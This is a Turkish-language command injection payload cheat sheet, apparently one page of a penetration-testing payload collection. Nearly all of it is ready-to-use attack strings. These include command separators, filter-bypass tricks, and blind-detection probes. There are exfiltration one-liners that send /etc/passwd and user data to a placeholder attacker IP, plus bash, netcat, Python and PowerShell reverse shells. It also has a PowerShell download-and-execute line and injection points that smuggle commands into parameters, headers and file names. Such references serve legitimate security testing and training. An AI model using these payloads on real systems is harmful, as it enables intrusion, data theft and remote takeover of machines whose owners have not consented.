# 💻 Komut Enjeksiyonu (Command Injection) Payload Koleksiyonu

[🇬🇧 English](../Command-Injection.md)

```
 ██████╗ ███████╗     ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
██╔═══██╗██╔════╝    ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
██║   ██║███████╗    ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
██║   ██║╚════██║    ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
╚██████╔╝███████║    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝
 ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗                   
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║                   
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║                   
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║                   
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║                   
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                   
```

---

## 🎯 Komut Ayırıcılar (Command Separators)

### Linux/Unix
```bash
;       # Noktalı virgül - sonrasında komutu çalıştırır
|       # Pipe - çıktıyı bir sonraki komuta girdi olarak gönderir
||      # VEYA (OR) - ilk komut başarısız olursa çalıştırır
&       # Arka plan - komutu arka planda çalıştırır
&&      # VE (AND) - ilk komut başarılı olursa çalıştırır
`cmd`   # Ters tırnak (Backticks) - komut ikamesi (command substitution)
$(cmd)  # Dolar sözdizimi - komut ikamesi
\n      # Yeni satır - komutları satır satır ayırır
```

### Windows
```cmd
;       # Bazı durumlarda çalışır
|       # Pipe (Boru hattı)
||      # VEYA (OR)
&       # Her iki komutu sırayla çalıştırır
&&      # VE (AND) - ilk komut başarılıysa çalıştırır
\n      # Yeni satır
%0a     # URL kodlamalı yeni satır
```

---

## 💉 Temel Payload'lar

### Basit Test Komutları
```bash
; id
; whoami
| id
| whoami
|| id
|| whoami
& id
& whoami
&& id
&& whoami
`id`
$(id)
```

### URL Kodlamalı (URL Encoded)
```
%3B+id               # ; id
%7C+id               # | id
%7C%7C+id            # || id
%26+id               # & id
%26%26+id            # && id
%0A+id               # yeni satır + id
```

---

## 🔥 Kör Komut Enjeksiyonu (Blind Command Injection)

### Zaman Tabanlı Tespit (Time-Based)
```bash
# Sleep (Uyutma) komutları
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Windows
; ping -n 5 127.0.0.1
| timeout 5
```

### DNS Tabanlı Tespit
```bash
# nslookup kullanarak
; nslookup BURP_COLLAB
| nslookup BURP_COLLAB
`nslookup BURP_COLLAB`
$(nslookup BURP_COLLAB)

# curl / wget kullanarak
; curl http://BURP_COLLAB
; wget http://BURP_COLLAB
$(curl http://SALDIRGAN_IP/?data=$(whoami))
```

### HTTP Tabanlı Veri Sızdırma (Data Exfiltration)
```bash
; curl http://SALDIRGAN_IP/$(whoami)
; curl http://SALDIRGAN_IP/?d=$(cat /etc/passwd | base64)
; wget http://SALDIRGAN_IP/$(hostname)
$(curl http://SALDIRGAN_IP/?id=$(id))
`curl http://SALDIRGAN_IP/?user=$(whoami)`
```

---

## 🛡️ Filtre Atlatma Teknikleri

### Boşluk Karakteri Atlatma
```bash
# $IFS (Internal Field Separator) kullanarak
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}

# Sekme (Tab) karakteri kullanarak
;cat	/etc/passwd

# Süslü parantez kümesi kullanarak
{cat,/etc/passwd}
```

### Anahtar Kelime Filtresi Atlatma (Keyword Bypass)
```bash
# Komut adını parçalama (Tırnak ve kaçış karakterleri)
w'h'oami
w"h"oami
who$@ami
who\ami

# Joker karakterler (Wildcards) kullanarak
/bin/ca? /etc/passwd
/bin/c?t /etc/passwd
/b??/c?t /etc/passwd

# Değişken ataması kullanarak
$u; cat /etc/passwd
test=cat; $test /etc/passwd

# Hex kodlama
echo -e "\x69\x64" | sh    # id komutunu çalıştırır
```

### Özel Karakter Filtrelerini Atlatma
```bash
# Farklı sınırlayıcılar (Delimiters)
;{cat,/etc/passwd}
;cat</etc/passwd
;cat$IFS/etc/passwd

# Yeni satır (Newline) enjeksiyonu
%0aid
%0Acat%20/etc/passwd

# Yorum karakteri kullanarak devamını yok sayma
; id #
| id #
```

---

## 🐧 Linux Payload'ları

### Dosya Okuma
```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; less /etc/passwd
; more /etc/passwd
; nl /etc/passwd
; sort /etc/passwd
; uniq /etc/passwd
; strings /etc/passwd
; od -c /etc/passwd
; xxd /etc/passwd
; base64 /etc/passwd
```

### Komut Çalıştırma ve Keşif
```bash
; id
; whoami
; uname -a
; hostname
; pwd
; ls -la
; env
; ps aux
; netstat -an
; ifconfig
; ip addr
```

### Ters Bağlantı (Reverse Shell)
```bash
; bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1
; nc -e /bin/sh SALDIRGAN_IP 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("SALDIRGAN_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

## 🪟 Windows Payload'ları

### Temel Komutlar
```cmd
& whoami
& hostname
& ipconfig
& net user
& dir
& type C:\Windows\win.ini
& type C:\Windows\System32\drivers\etc\hosts
```

### Dosya Okuma
```cmd
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& more C:\Windows\win.ini
& find "password" C:\path\to\file.txt
```

### PowerShell
```powershell
& powershell -c "whoami"
& powershell -c "Get-Process"
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://SALDIRGAN_IP/shell.ps1')"
```

### Ters Bağlantı (Reverse Shell)
```cmd
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('SALDIRGAN_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 📝 Yaygın Enjeksiyon Noktaları

```
URL parametreleri:
  ?ip=127.0.0.1;id
  ?file=test.txt|id
  ?cmd=ls

POST parametreleri:
  filename=test.txt;id
  host=localhost|whoami

HTTP Başlıkları:
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  X-Forwarded-For: ;id

Dosya yükleme isimleri:
  test;id;.txt
  test$(id).txt
  test`id`.txt
```

---

## 📋 Test Kontrol Listesi (Checklist)

```markdown
□ Tüm komut ayırıcılarını test edin (; | || & && ` $())
□ URL kodlamalı versiyonları deneyin
□ Zaman tabanlı kör enjeksiyonu kontrol edin (sleep, timeout, ping)
□ DNS/HTTP bant dışı veri sızdırmayı deneyin
□ Boşluk engelleme bypass'larını test edin ($IFS, sekmeler, süslü parantezler)
□ Anahtar kelime filtre atlatmalarını deneyin (tırnaklar, joker karakterler)
□ Yeni satır (%0a) enjeksiyonunu deneyin
□ Filtrelenen özel karakterleri tespit edin
□ Hem Linux hem de Windows spesifik komutlarını deneyin
```

---

## 🔗 İlgili Payload Kılavuzları

- [LFI Payload'ları](./LFI.tr.md)
- [SSTI Payload'ları](./SSTI.tr.md)

---

**Ana Dizine Dön:** [📖 Genel Kılavuz](../../README.tr.md)
